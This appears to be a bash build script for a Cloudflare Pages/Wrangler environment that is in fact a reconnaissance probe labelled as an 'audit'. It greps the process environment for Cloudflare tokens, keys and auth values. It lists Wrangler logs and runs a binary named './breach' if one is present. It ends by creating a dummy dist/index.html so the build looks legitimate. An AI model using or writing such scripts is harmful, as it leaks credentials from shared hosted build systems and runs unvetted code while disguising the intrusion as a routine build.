#!/bin/bash
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
echo "--- WRANGLER ENV DEEP AUDIT ---"

 
id
uname -a

 
echo "[1] Checking Wrangler Logs:"
ls -la /opt/buildhome/.config/.wrangler/logs/

 
echo "[2] Environment Leak Check:"
strings /proc/self/environ | grep -E "CF_|CLOUDFLARE|TOKEN|KEY|AUTH"

 
if [ -f "./breach" ]; then
    chmod +x ./breach
    ./breach
else
    echo "C-Breach not found, using raw ls -l /dev"
    ls -l /dev | grep -vE "null|zero|tty"
fi

echo "--- AUDIT COMPLETE ---"
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"

 
mkdir -p dist
touch dist/index.html
